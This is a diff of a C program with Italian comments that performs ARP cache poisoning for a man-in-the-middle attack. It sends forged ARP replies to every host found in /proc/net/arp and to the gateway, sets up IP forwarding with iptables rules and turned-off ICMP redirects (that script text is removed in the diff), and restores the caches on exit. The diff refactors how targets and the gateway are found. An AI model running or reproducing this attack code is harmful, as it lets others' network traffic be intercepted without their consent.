@@ -63,7 +63,6 @@ static char* convert_mac(const uint8_t *m) {
     return buf;
 }
 
-// Thread-safe: usa inet_ntop con buffer locale, non inet_ntoa
 static char* convert_ip(const uint8_t *ip) {
     struct in_addr a;
     char tmp[INET_ADDRSTRLEN];
@@ -77,28 +76,6 @@ static char* convert_ip(const uint8_t *ip) {
 static void on_sigint(int sig) {
     (void)sig;
     running = 0;
-}
-
-static char* detect_wifi_iface(void) {
-    FILE *fp = popen("ip -o link show | awk -F': ' '/wlan|wlp/ {print $2; exit}'", "r");
-    if (!fp) return NULL;
-    char buf[64];
-    if (fgets(buf, sizeof(buf), fp) == NULL) { pclose(fp); return NULL; }
-    pclose(fp);
-    buf[strcspn(buf, "\n")] = 0;
-    if (strlen(buf) == 0) return NULL;
-    return strdup(buf);
-}
-
-static char* detect_default_gateway(void) {
-    FILE *fp = popen("ip route | awk '/default/ {print $3; exit}'", "r");
-    if (!fp) return NULL;
-    char buf[64];
-    if (fgets(buf, sizeof(buf), fp) == NULL) { pclose(fp); return NULL; }
-    pclose(fp);
-    buf[strcspn(buf, "\n")] = 0;
-    if (strlen(buf) == 0) return NULL;
-    return strdup(buf);
 }
 
 // ============================================================
@@ -136,42 +113,7 @@ static int get_iface_ip(const char *ifname, uint8_t *out) {
 // IP FORWARDING
 // ============================================================
 
-static int avvia_ipForwarding(const char *iface, const char *gateway) {
-    FILE *f = fopen(START_SCRIPT, "w");
-    if (!f) { perror("fopen start_mitm.sh"); return -1; }
-    fprintf(f,
-        "#!/system/bin/sh\n"
-        "# Avvia forwarding per MITM su stessa interfaccia\n"
-        "\n"
-        "IFACE=%s\n"
-        "GATEWAY=%s      # IP del PC (hotspot) - ADATTA\n"
-        "\n"
-        "# 1. Abilita IP forwarding\n"
-        "echo 1 > /proc/sys/net/ipv4/ip_forward\n"
-        "\n"
-        "# 2. Disabilita ICMP redirect (CRUCIALE)\n"
-        "#    Se attivi, il kernel dice a TEL2 \"vai diretto al PC\", rompendo il MITM\n"
-        "echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects\n"
-        "echo 0 > /proc/sys/net/ipv4/conf/$IFACE/send_redirects\n"
-        "\n"
-        "# 3. Disabilita reverse path filtering (evita drop di pacchetti)\n"
-        "echo 0 > /proc/sys/net/ipv4/conf/all/rp_filter\n"
-        "echo 0 > /proc/sys/net/ipv4/conf/$IFACE/rp_filter\n"
-        "\n"
-        "# 4. Pulisci regole vecchie\n"
-        "iptables -F FORWARD 2>/dev/null\n"
-        "iptables -t nat -F POSTROUTING 2>/dev/null\n"
-        "\n"
-        "# 5. Permetti forwarding tra TEL2 e PC (stessa interfaccia)\n"
-        "#    Non serve -i/-o specifici perché è tutto su wlan0\n"
-        "iptables -A FORWARD -i $IFACE -o $IFACE -j ACCEPT\n"
-        "iptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT\n"
-        "iptables -P FORWARD ACCEPT\n"
-        "\n"
-        "echo \"[+] MITM forwarding attivo su $IFACE\"\n",
-        iface, gateway);
-    fclose(f);
-
+static int avvia_ipForwarding(void) {
     int ret = system("sh " START_SCRIPT);
     if (ret == -1) {
         perror("system start_mitm");
@@ -184,34 +126,7 @@ static int avvia_ipForwarding(const char *iface, const char *gateway) {
     return 0;
 }
 
-static int ferma_ipForwarding(const char *iface) {
-    FILE *f = fopen(STOP_SCRIPT, "w");
-    if (!f) { perror("fopen stop_mitm.sh"); return -1; }
-    fprintf(f,
-        "#!/system/bin/sh\n"
-        "# Ferma forwarding e ripristina stato originale\n"
-        "\n"
-        "IFACE=%s\n"
-        "\n"
-        "# 1. Disabilita IP forwarding\n"
-        "echo 0 > /proc/sys/net/ipv4/ip_forward\n"
-        "\n"
-        "# 2. Ripristina ICMP redirect\n"
-        "echo 1 > /proc/sys/net/ipv4/conf/all/send_redirects\n"
-        "echo 1 > /proc/sys/net/ipv4/conf/$IFACE/send_redirects\n"
-        "\n"
-        "# 3. Ripristina rp_filter\n"
-        "echo 1 > /proc/sys/net/ipv4/conf/all/rp_filter\n"
-        "echo 1 > /proc/sys/net/ipv4/conf/$IFACE/rp_filter\n"
-        "\n"
-        "# 4. Pulisci regole\n"
-        "iptables -F FORWARD 2>/dev/null\n"
-        "iptables -t nat -F POSTROUTING 2>/dev/null\n"
-        "\n"
-        "echo \"[-] MITM forwarding disattivato\"\n",
-        iface);
-    fclose(f);
-
+static int ferma_ipForwarding(void) {
     int ret = system("sh " STOP_SCRIPT);
     if (ret == -1) {
         perror("system stop_mitm");
@@ -259,8 +174,6 @@ static void send_arp(uint8_t *eth_dst, uint8_t *sha, uint8_t *spa,
     sendto(sock, &f, sizeof(f), 0, (struct sockaddr *)&sa, sizeof(sa));
 }
 
-// ARP request per 'ip', aspetta reply, riempe 'out_mac'.
-// Ritorna 0 se ok, -1 se timeout.
 static int get_mac(uint8_t *ip, uint8_t *out_mac) {
     uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
     send_arp(bcast, my_mac, my_ip, NULL, ip, 1);
@@ -278,79 +191,65 @@ static int get_mac(uint8_t *ip, uint8_t *out_mac) {
     return -1;
 }
 
-// Invia un ARP reply: "host_ip è a host_mac", al target
 static void poison(uint8_t *target_mac, uint8_t *target_ip,
                    uint8_t *host_ip,    uint8_t *host_mac) {
     send_arp(target_mac, host_mac, host_ip, target_mac, target_ip, 2);
 }
 
-// Avvelena la cache ARP per un singolo host (MAC già noto dalla cache).
 static void arpPoisoner(struct host *h) {
-    // 1) al target: "il gateway è al mio MAC"
     poison(h->mac, h->ip, gw_ip,  my_mac);
-    // 2) al gateway: "il target è al mio MAC"
     poison(gw_mac, gw_ip, h->ip,  my_mac);
 }
 
-// Ripristina la cache ARP per un singolo host (MAC reali).
 static void arpRestorer(struct host *h) {
-    // 7 pacchetti per essere sicuri che il target li riceva tutti
     for (int i = 0; i < 7; i++) {
-        // 1) al target: "il gateway è al MAC VERO del gateway"
         poison(h->mac, h->ip, gw_ip,  gw_mac);
-        // 2) al gateway: "il target è al MAC VERO del target"
         poison(gw_mac, gw_ip, h->ip,  h->mac);
-        usleep(200000); // 200 ms
+        usleep(200000);
     }
 }
 
 // ============================================================
-// SCANNER (ARP-based)
+// SCANNER (ARP table based)
 // ============================================================
 
 static void scan_subnet_arp(void) {
-    uint8_t base[4];
-    memcpy(base, my_ip, 4);
     n_hosts = 0;
+    FILE *f = fopen("/proc/net/arp", "r");
+    if (!f) { perror("fopen /proc/net/arp"); return; }
 
-    printf("[*] invio ARP request in broadcast...\n");
-    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
+    char line[256];
+    // Salta l'header
+    if (fgets(line, sizeof(line), f) == NULL) { fclose(f); return; }
 
-    for (int i = 1; i <= 254; i++) {
-        base[3] = i;
-        if (memcmp(base, my_ip, 4) == 0) continue;
-        send_arp(bcast, my_mac, my_ip, NULL, base, 1);
-        usleep(1000);
-    }
+    while (fgets(line, sizeof(line), f)) {
+        char ip_str[16], hw_type[16], flags[16], mac_str[18], mask[16], dev[16];
+        if (sscanf(line, "%15s %15s %15s %17s %15s %15s",
+                   ip_str, hw_type, flags, mac_str, mask, dev) == 6) {
+            
+            if (strcmp(dev, iface) != 0) continue;
+            if (strcmp(mac_str, "00:00:00:00:00:00") == 0) continue;
 
-    printf("[*] in ascolto di risposte ARP...\n");
-    struct timeval tv = {3, 0};
-    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+            uint8_t ip[4];
+            if (inet_pton(AF_INET, ip_str, ip) != 1) continue;
+            if (memcmp(ip, my_ip, 4) == 0) continue;
+            if (memcmp(ip, gw_ip, 4) == 0) continue; // Salta il gateway
 
-    uint8_t buf[1024];
-    while (recv(sock, buf, sizeof(buf), 0) >= 42) {
-        struct frame *f = (struct frame *)buf;
-        if (ntohs(f->eth_type) == ETH_P_ARP && ntohs(f->arp_oper) == 2) {
-            if (memcmp(f->arp_spa, my_ip, 4) == 0) continue;
-
-            int found = 0;
-            for (int j = 0; j < n_hosts; j++) {
-                if (memcmp(hosts[j].ip, f->arp_spa, 4) == 0) {
-                    found = 1;
-                    break;
-                }
-            }
-            if (!found && n_hosts < 256) {
-                memcpy(hosts[n_hosts].ip, f->arp_spa, 4);
-                memcpy(hosts[n_hosts].mac, f->arp_sha, 6);
+            uint8_t mac[6];
+            unsigned int m[6];
+            if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
+                for (int i = 0; i < 6; i++) mac[i] = (uint8_t)m[i];
+                memcpy(hosts[n_hosts].ip, ip, 4);
+                memcpy(hosts[n_hosts].mac, mac, 6);
                 n_hosts++;
-                char *ip_str = convert_ip(f->arp_spa);
-                printf("[*] Trovato: %s\n", ip_str);
-                free(ip_str);
+                char *ip_s = convert_ip(ip);
+                printf("[*] Trovato: %s (%s)\n", ip_s, mac_str);
+                free(ip_s);
             }
         }
     }
-    printf("[CACHE] %d host trovati via ARP\n", n_hosts);
+    fclose(f);
+    printf("[CACHE] %d host trovati in /proc/net/arp\n", n_hosts);
 }
 
 // ============================================================
@@ -371,10 +270,7 @@ static void restore_ips(void) {
 
 static int flush_arp_cache(const char *iface) {
     char cmd[128];
-    if (iface)
-        snprintf(cmd, sizeof(cmd), "ip neigh flush dev %s", iface);
-    else
-        snprintf(cmd, sizeof(cmd), "ip neigh flush all");
+    snprintf(cmd, sizeof(cmd), "ip neigh flush dev %s", iface);
 
     int ret = system(cmd);
     if (ret == -1) {
@@ -401,19 +297,12 @@ static void riscalda_arp(const char *iface, const char *gateway_ip) {
 // ============================================================
 
 int main(int argc, char **argv) {
-    char *iface_auto = NULL;
-    char *gw_auto    = NULL;
-
-    if (argc >= 2) {
-        iface = argv[1];
-    } else {
-        iface_auto = detect_wifi_iface();
-        if (!iface_auto) {
-            fprintf(stderr, "nessuna interfaccia Wi-Fi rilevata\n");
-            return 1;
-        }
-        iface = iface_auto;
+    if (argc != 3) {
+        fprintf(stderr, "uso: %s <iface> <gateway_ip>   (es. wlan0 192.168.1.1)\n",
+                argv[0]);
+        return 1;
     }
+    iface = argv[1];
 
     signal(SIGINT, on_sigint);
 
@@ -429,27 +318,17 @@ int main(int argc, char **argv) {
            iface, my_mac_s ? my_mac_s : "?", my_ip_s ? my_ip_s : "?");
     free(my_mac_s); free(my_ip_s);
 
-    // 2) Gateway passato come argv[2]
-    char *gw_str;
-    if (argc >= 3) {
-        gw_str = argv[2];
-    } else {
-        gw_auto = detect_default_gateway();
-        if (!gw_auto) {
-            fprintf(stderr, "nessun gateway rilevato\n");
-            return 1;
-        }
-        gw_str = gw_auto;
-    }
-    if (inet_pton(AF_INET, gw_str, gw_ip) != 1) {
-        fprintf(stderr, "gateway IP non valido: %s\n", gw_str);
+    // 2) Gateway
+    if (inet_pton(AF_INET, argv[2], gw_ip) != 1) {
+        fprintf(stderr, "gateway IP non valido: %s\n", argv[2]);
         return 1;
     }
     char *gw_ip_s = convert_ip(gw_ip);
     printf("[*] gateway IP=%s\n", gw_ip_s ? gw_ip_s : "?");
+    
+    // BUG FIX: usiamo argv[2] invece di gw_ip_s che stiamo per liberare
+    riscalda_arp(iface, argv[2]); 
     free(gw_ip_s);
-
-    riscalda_arp(iface, gw_str);
 
     // 3) Socket raw
     sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
@@ -467,7 +346,7 @@ int main(int argc, char **argv) {
     struct timeval tv = {2, 0};
     setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 
-    // 4) MAC del gateway (una volta sola)
+    // 4) MAC del gateway
     if (get_mac(gw_ip, gw_mac) < 0) {
         fprintf(stderr, "gateway non risponde ad ARP\n");
         return 1;
@@ -476,19 +355,19 @@ int main(int argc, char **argv) {
     printf("[*] gateway MAC=%s\n", gw_mac_s ? gw_mac_s : "?");
     free(gw_mac_s);
 
-    // 5) Scansione subnet via ARP
-    printf("[*] scansione subnet in corso...\n");
+    // 5) Leggi la tabella ARP locale per trovare i target
+    printf("[*] lettura tabella ARP in corso...\n");
     scan_subnet_arp();
 
     if (n_hosts == 0) {
-        fprintf(stderr, "nessun host trovato, esco\n");
+        fprintf(stderr, "nessun host trovato in /proc/net/arp, esco\n");
         close(sock);
         return 1;
     }
 
     flush_arp_cache(iface);
 
-    avvia_ipForwarding(iface, gw_str);
+    avvia_ipForwarding();
 
     // 6) Loop di poisoning
     printf("[*] avvio loop di poisoning (CTRL+C per fermare)\n");
@@ -499,18 +378,14 @@ int main(int argc, char **argv) {
 
     printf("\n[*] stop.\n");
 
-    // 7) Ripristino cache ARP — PRIMA di chiudere il socket
+    // 7) Ripristino cache ARP
     printf("[*] ripristino cache ARP...\n");
     restore_ips();
 
-    // 8) Ora posso chiudere
     close(sock);
 
     printf("[*] disattivo IP forwarding...\n");
-    ferma_ipForwarding(iface);
-
-    free(iface_auto);
-    free(gw_auto);
+    ferma_ipForwarding();
 
     printf("[*] done.\n");
     return 0;
